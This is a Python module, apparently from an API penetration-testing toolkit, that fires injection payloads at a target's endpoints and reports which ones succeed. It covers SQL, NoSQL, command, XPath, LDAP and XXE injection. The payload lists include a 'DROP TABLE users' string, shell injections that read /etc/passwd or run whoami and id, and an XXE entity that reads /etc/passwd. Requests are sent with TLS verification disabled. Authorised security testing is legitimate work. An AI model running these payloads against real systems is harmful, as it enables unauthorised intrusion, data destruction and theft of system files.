"""
Injection Attacks Module (API Focused)
- SQL Injection
- NoSQL Injection
- Command Injection
- XPath/XML Injection
- LDAP Injection
"""

import requests
import json
from typing import Dict, Any, List
import logging

logger = logging.getLogger(__name__)

class InjectionAttackAnalyzer:
    """Analyze injection vulnerabilities in APIs"""
    
    def __init__(self, base_url: str, token: str = None):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.headers = {'Authorization': f'Bearer {token}'} if token else {}
        self.headers['Content-Type'] = 'application/json'
        
    def test_sql_injection(self, endpoint: str, param: str) -> Dict[str, Any]:
        """Test SQL Injection in API parameters"""
        logger.info(f"[*] Testing SQL injection on {endpoint}...")
        
        sql_payloads = [
            "1' OR '1'='1",
            "1'; DROP TABLE users; --",
            "1' UNION SELECT NULL,NULL,NULL --",
            "1' AND SLEEP(5) --",
            "1' OR 1=1 --"
        ]
        
        vulnerable = False
        
        for payload in sql_payloads:
            try:
                params = {param: payload}
                resp = requests.get(
                    f"{self.base_url}{endpoint}",
                    params=params,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if 'syntax' in resp.text.lower() or 'sql' in resp.text.lower():
                    logger.info(f"[+] SQL error detected with: {payload}")
                    vulnerable = True
            except:
                pass
        
        return {
            'vulnerable': vulnerable,
            'technique': 'SQL Injection',
            'payloads_tested': len(sql_payloads)
        }
    
    def test_nosql_injection(self, endpoint: str) -> Dict[str, Any]:
        """Test NoSQL Injection in JSON APIs"""
        logger.info(f"[*] Testing NoSQL injection on {endpoint}...")
        
        nosql_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"$where": "this.username == 'admin'"},
            {"username": {"$regex": "^admin"}},
            {"$or": [{"username": "admin"}, {"admin": True}]},
            {"email": {"$nin": [""]}}
        ]
        
        vulnerable_payloads = []
        
        for payload in nosql_payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200 or 'user' in resp.text.lower():
                    logger.info(f"[+] NoSQL payload accepted: {json.dumps(payload)}")
                    vulnerable_payloads.append(payload)
            except:
                pass
        
        return {
            'vulnerable': len(vulnerable_payloads) > 0,
            'technique': 'NoSQL Injection',
            'successful_payloads': vulnerable_payloads
        }
    
    def test_command_injection(self, endpoint: str, param: str = None) -> Dict[str, Any]:
        """Test Command Injection in API parameters"""
        logger.info(f"[*] Testing command injection on {endpoint}...")
        
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(whoami)",
            "&& sleep 5",
            "| sleep 5",
            "; ping -c 1 127.0.0.1"
        ]
        
        vulnerable = False
        
        for payload in cmd_payloads:
            try:
                if param:
                    params = {param: f"input{payload}"}
                    resp = requests.get(
                        f"{self.base_url}{endpoint}",
                        params=params,
                        headers=self.headers,
                        timeout=5,
                        verify=False
                    )
                else:
                    resp = requests.post(
                        f"{self.base_url}{endpoint}",
                        json={"input": f"test{payload}"},
                        headers=self.headers,
                        timeout=5,
                        verify=False
                    )
                
                # Check for command output indicators
                if any(x in resp.text for x in ['root:', 'uid=', 'bin/', 'etc/']):
                    logger.info(f"[+] Command injection indicator found")
                    vulnerable = True
            except:
                pass
        
        return {
            'vulnerable': vulnerable,
            'technique': 'Command Injection',
            'payloads_tested': len(cmd_payloads)
        }
    
    def test_xpath_injection(self, endpoint: str) -> Dict[str, Any]:
        """Test XPath Injection"""
        logger.info(f"[*] Testing XPath injection on {endpoint}...")
        
        xpath_payloads = [
            "' or '1'='1",
            "' or 1=1 or '",
            "admin' or '1",
            "' or string-length(//user/password)=5 or '"
        ]
        
        vulnerable = False
        
        for payload in xpath_payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    json={"username": payload},
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200:
                    logger.info(f"[+] XPath payload accepted")
                    vulnerable = True
            except:
                pass
        
        return {
            'vulnerable': vulnerable,
            'technique': 'XPath Injection'
        }
    
    def test_ldap_injection(self, endpoint: str) -> Dict[str, Any]:
        """Test LDAP Injection"""
        logger.info(f"[*] Testing LDAP injection on {endpoint}...")
        
        ldap_payloads = [
            "*",
            "*)(|(uid=*",
            "admin*",
            "*)(|(mail=*"
        ]
        
        vulnerable = False
        
        for payload in ldap_payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    json={"username": payload},
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200:
                    logger.info(f"[+] LDAP payload accepted: {payload}")
                    vulnerable = True
            except:
                pass
        
        return {
            'vulnerable': vulnerable,
            'technique': 'LDAP Injection'
        }
    
    def test_xml_xxe_injection(self, endpoint: str) -> Dict[str, Any]:
        """Test XML External Entity (XXE) Injection"""
        logger.info(f"[*] Testing XXE injection on {endpoint}...")
        
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>'''
        
        try:
            resp = requests.post(
                f"{self.base_url}{endpoint}",
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=5,
                verify=False
            )
            
            if 'root:' in resp.text or 'uid=' in resp.text:
                logger.info(f"[+] XXE vulnerability detected")
                return {
                    'vulnerable': True,
                    'technique': 'XXE Injection',
                    'file_content': resp.text[:500]
                }
        except:
            pass
        
        return {'vulnerable': False}
    
    def analyze(self) -> Dict[str, Any]:
        """Run full injection attack analysis"""
        logger.info("[*] Starting injection attack analysis...")
        
        results = {
            'sql_injection': self.test_sql_injection('/api/search', 'query'),
            'nosql_injection': self.test_nosql_injection('/api/login'),
            'command_injection': self.test_command_injection('/api/execute'),
            'xpath_injection': self.test_xpath_injection('/api/xml/query'),
            'ldap_injection': self.test_ldap_injection('/api/search/user'),
            'xxe_injection': self.test_xml_xxe_injection('/api/upload/xml')
        }
        
        return results
